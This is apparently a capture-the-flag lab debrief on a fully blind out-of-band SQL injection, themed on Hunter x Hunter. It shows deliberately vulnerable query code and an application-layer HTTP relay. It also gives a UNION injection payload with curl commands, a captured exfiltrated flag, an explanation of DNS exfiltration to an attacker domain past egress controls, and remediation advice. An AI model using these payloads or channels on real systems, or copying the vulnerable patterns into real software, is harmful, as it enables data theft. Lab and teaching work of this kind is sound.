# The Spell Card, Debrief

**Node:** `p3_1` &middot; **Flag:** `SEIYAKU{word_left_the_island}` &middot; **Route:** `GET /p3/spellcard` &middot; **Sink:** `challenges/phase3.py`, `mariadb` (`cards` table, `sealed_cards` table) &middot; **Confirmation channel:** `collaborator` (`GET /captures`, proxied at `GET /p3/spellcard/captures`)

## Root cause

The card reader builds its query with raw f-string concatenation, the
same sink shape as p1_1/p1_3, the value sits inside a single-quoted
string literal, no escaping:

```python
# challenges/phase3.py
q = f"SELECT effect FROM cards WHERE id='{card}'"  # VULN: string concat
cur.execute(q)
row = cur.fetchone()
```

What's different from every earlier floor is what happens next. Every
prior injection eventually gave you *something* back in the HTTP
response itself: a matching row, a distinguishable "not found" page, a
raw DBMS error, or a measurable delay. This route deliberately throws
all of that away:

```python
# challenges/phase3.py
except Exception:
    # Fully blind by design: every DB error is swallowed silently.
    value = None
...
return render_template("p3_spellcard.html", card=card)
```

`p3_spellcard.html` renders the identical "the card was cast into the
field" message regardless of `card`, regardless of whether the lookup
matched anything, and regardless of whether the query raised. There is
no boolean-blind, error-based, UNION-based, or time-based channel
available in-band, not because those techniques were patched, but
because the response was built specifically to give none of them
anywhere to surface.

## The confirmation channel: out-of-band (OOB) testing

**What it is.** Out-of-band confirmation is the standard technique for
exactly this situation: a target where the tester can influence a
backend query but the application's own response carries zero
data-dependent signal. Instead of reading the result off the response
that came back from the request that triggered it, the tester makes the
*target* originate a second, independent network call, to a host the
tester controls, carrying the data they're after. The confirmation is
read off that separate channel, not the original response.

**When it's used.** Any time in-band techniques (boolean-blind,
error-based, UNION-based, time-based) are all closed off at once, a
fully blind endpoint like this one, a background job or webhook handler
that never returns query data to any caller, or a target sitting behind
egress logging/monitoring where the tester needs proof a payload
actually executed server-side, independent of anything the app chooses
to say about it. It depends on one precondition: the target (or
something acting on its behalf) needs to be able to make an outbound
network connection at all, egress has to be permitted, even if nothing
in the response ever admits it.

**Two common channel types, and why DNS is the harder one to block:**

- **HTTP-based**, the target makes an outbound HTTP request (or the
  injected payload coaxes a database extension into one) carrying
  exfiltrated data in the path, query string, or a header, to a
  listener the tester controls. Easy to reason about, easy to filter,
  a network team that reviews or firewalls outbound HTTP from a database
  or app tier can catch it.
- **DNS-based**, the target resolves a hostname built from the
  exfiltrated data (`<data>.attacker-domain.com`), and the tester reads
  the confirmation off DNS query logs on their own authoritative
  nameserver, with no other connection ever made. This is the harder
  channel to block or even notice: DNS resolution is treated as
  infrastructure-plumbing, not "a network request," by most egress
  controls, a host that blocks arbitrary outbound HTTP/TCP from a
  database server often still lets that same server resolve hostnames
  freely, because name resolution is assumed to be inert. It usually
  isn't logged or reviewed with anything like the scrutiny outbound HTTP
  gets, and a single UDP packet to port 53 blends into completely
  ordinary background traffic. This is exactly why real-world OOB-SQLi
  tooling (and real attackers) reach for DNS exfiltration specifically
  when HTTP egress is locked down but DNS resolution, as it almost
  always is, is not.

This lab's `collaborator` service (`collaborator/collaborator.py`)
implements both a capture-everything HTTP listener and a capture-
everything DNS listener, on the same host, precisely so both channel
types are available to build lessons against. This particular floor
uses the HTTP channel, see "A note on the channel choice" below for
why.

## What this lab's mechanism actually is (read `docs/oob-spike.md` for the full spike)

In a textbook OOB-SQLi engagement, the component that decides to make
the outbound call is normally something the *injected SQL itself*
invokes directly, a DB-native extension or stored procedure (an
`xp_dirtree`-style call on SQL Server, `UTL_HTTP` on Oracle, a working
`dblink`/`FEDERATED` setup on MySQL/MariaDB) with no application code
involved at all. A pre-task spike
([`docs/oob-spike.md`](../../docs/oob-spike.md)) checked, against this
exact lab's live `mariadb:11` image, whether any stock capability could
do that here, the classic Windows-SMB `LOAD_FILE('\\\\host\\share')`
trick (confirmed not to apply on Linux at all), and every default-
installable storage engine (`FEDERATED` genuinely can dial out, verified
live, but only speaks the MySQL wire protocol and requires a privileged
`INSTALL SONAME` bootstrap no injected `SELECT` could trigger on its
own, not usable as this lesson's actual trigger). No stock, vanilla-
Linux-MariaDB-native mechanism panned out.

**The decision this floor is built on:** the outbound call is made by
the **Flask application layer**, not MariaDB itself. The route reads a
value back from a MariaDB query, and the *application code*, not the
database, relays that value onward as a real, separate outbound HTTP
request to `collaborator`:

```python
# challenges/phase3.py
relay_value = value if value else "no-effect"
try:
    requests.get(
        f"{COLLABORATOR_BASE}/spellcard-cast/{quote(str(relay_value), safe='')}",
        timeout=2,
    )
except Exception:
    pass
```

**What's genuinely real here:** the network hop from the Flask process
to `collaborator` is an actual, independent HTTP round trip over the
docker-compose network, `collaborator` really does observe a second,
separate incoming connection carrying the query's real result, with
nothing about it faked, logged in-process, or short-circuited. A tester
reads the confirmation off `collaborator`'s own capture feed, with zero
cooperation from the request/response cycle that triggered it, exactly
the tester-visible experience a genuine DB-native OOB primitive would
produce.

**What's simplified, and stated plainly:** the specific hop that
*decides* to phone home lives in this lab's application code, not inside
MariaDB, because (per the spike) nothing stock and stable in a vanilla
Linux MariaDB image can play that role directly. Students should walk
away understanding the general OOB-SQLi technique and reading the
confirmation off a channel independent of the vulnerable response, not
the claim that MariaDB itself made this specific call.

### A note on the channel choice: HTTP over DNS for this floor

`collaborator` supports both channel types, but this floor's relay uses
HTTP exclusively rather than encoding the value into a DNS query name.
The flag format (`SEIYAKU{word_left_the_island}`) contains characters,
`{`, `}`, that aren't valid in a DNS label at all, and a resolver
handed an invalid label typically just fails the lookup outright rather
than delivering a usable signal. An HTTP path can carry arbitrary bytes
via ordinary percent-encoding (`urllib.parse.quote`) with no such
restriction, which is why it's the channel this floor's relay actually
uses. The DNS side of `collaborator` remains fully live and captured for
any future lesson that wants to teach the DNS variant specifically with
data shaped to survive a DNS label.

## The walk: hand-crafting the payload

Unlike p2_1/p2_2/p2_3 (numeric parameters, sqlmap's default heuristics),
`card` sits inside a single-quoted string context, the same shape as
p1_1's login bypass and p1_3's UNION injection. Closing the quote and
appending a `UNION SELECT` against the hidden table swaps the flag in as
the query's one returned column (`effect`):

```
card = nonexistent' UNION SELECT secret FROM sealed_cards-- -
```

- `nonexistent'` closes the string literal early, the query no longer
  looks for a card named `nonexistent`.
- `UNION SELECT secret FROM sealed_cards` adds a second SELECT with the
  same one-column shape (`effect` vs `secret`), pulling the flag in as
  that row's value instead.
- `-- -` comments out the query's original trailing `'` so it doesn't
  break the syntax.

### Sending it

```bash
curl -s -G "http://localhost:8000/p3/spellcard" \
    --data-urlencode "card=nonexistent' UNION SELECT secret FROM sealed_cards-- -"
```

The response, verified live against this exact seed, for a benign
card, the injection payload above, and a deliberately malformed payload
meant to force a raw DBMS exception, is **byte-for-byte the same
"the card was cast into the field" block** every time. No effect text,
no error text, nothing that varies with input. This is the whole
teaching point: the in-band response gives literally nothing away.

### Reading the confirmation

```bash
curl -s "http://localhost:8000/p3/spellcard/captures"
```

Real, live output from this exact seed and this exact payload (proxied
through the portal's own `/p3/spellcard/captures`, since `collaborator`
only answers other containers on the compose network, not a browser
directly):

```json
[
  {
    "type": "http",
    "timestamp": "2026-09-08T17:18:07.835963+00:00",
    "method": "GET",
    "path": "/spellcard-cast/SEIYAKU%7Bword_left_the_island%7D",
    "query": {},
    "raw_query": "",
    "headers": {
      "Host": "collaborator",
      "User-Agent": "python-requests/2.34.2",
      "Accept-Encoding": "gzip, deflate",
      "Accept": "*/*",
      "Connection": "keep-alive"
    },
    "body": "",
    "client_ip": "172.19.0.4"
  }
]
```

`%7B`/`%7D` are the percent-encoded forms of `{`/`}`,
`urllib.parse.unquote("SEIYAKU%7Bword_left_the_island%7D")` decodes to
`SEIYAKU{word_left_the_island}`, the flag, arriving in the path of a
real HTTP request the Flask process made to `collaborator`, entirely
separate from (and after) the original blind response the browser
already received. This is exactly what `solvers/p3_1.sh` automates: send
the payload, then poll `/p3/spellcard/captures` (URL-encoding the flag
the same way to match) until it shows up, with a bounded retry loop
rather than assuming it lands instantly.

For contrast, casting a real, unmodified card (`card=thunderbolt`)
produces the same shape of capture, carrying the card's genuine
in-catalog effect text instead:

```json
{
  "type": "http",
  "path": "/spellcard-cast/Deals%2030%20lightning%20damage%20to%20a%20single%20target%20on%20the%20field.",
  ...
}
```

, confirming the relay mechanism is generic (it forwards whatever the
query returns) and not somehow special-cased around the flag.

## HxH analogy

Greed Island's game master is scrupulously consistent: every card
resolves through the same reporting channel, and that channel tells a
player nothing beyond "it happened." That consistency is the trap,
it's easy to mistake "the game master won't tell me" for "there's
nothing to find out." But the game master reading a card and *the game
itself* aren't the same thing. The field changes. Effects land. Word of
what actually happened can still leave the island, just not through
the one channel the game master is watching. This floor's lesson is
literal: the confirmation was never going to come back through the
front door. It travels through a channel nobody standing at that front
door ever thought to watch.

## Remediation

- **Parameterized queries, always**, the same root fix as every
  injection in this lab:

  ```python
  cur.execute(
      "SELECT effect FROM cards WHERE id=%s",
      (card,),
  )
  ```

  This is the actual fix, and it closes the vulnerability regardless of
  whether the response is blind or not, a fully blind response only
  changes how hard the bug is to *detect*, not whether it exists. Root
  cause is still attacker text reaching the query as code instead of
  data, exactly like every earlier floor.
- **The application must never make outbound network calls carrying
  untrusted, request-influenced data as part of handling a request.**
  This floor's relay (`requests.get(f".../spellcard-cast/{value}")`) is
  the deliberate teaching vehicle for the OOB channel, but it's also,
  named plainly, the exact shape of a real-world SSRF-adjacent
  antipattern: letting data that traces back to attacker input decide
  the destination or payload of a server-initiated request. In a real
  application, this pattern is a bug in its own right (SSRF, internal
  metadata-endpoint exposure, blind exfiltration of anything the query
  layer can reach) independent of whatever injection first supplied the
  value.
- **Egress filtering on the database and application tiers.** The reason
  OOB confirmation works at all, here and in real engagements, is that
  outbound connections from a backend service were possible in the first
  place. A database server with no route to the internet (or to hosts
  outside an explicit allowlist) can't be coaxed into confirming
  anything via a callback, `FEDERATED` table, or DNS lookup, no matter
  how the injection is shaped. The same applies to the application tier
  making outbound calls on the query's behalf, as this floor's relay
  does. Least-privilege egress is the single control that would have
  silenced this exact channel outright, regardless of how the underlying
  query bug got fixed.
- **Least-privilege database accounts**, same as every floor in this
  lab: a DB user scoped to only the tables a route actually needs means
  a successful injection here still can't reach a table like
  `sealed_cards` that this route's own legitimate query never touches.
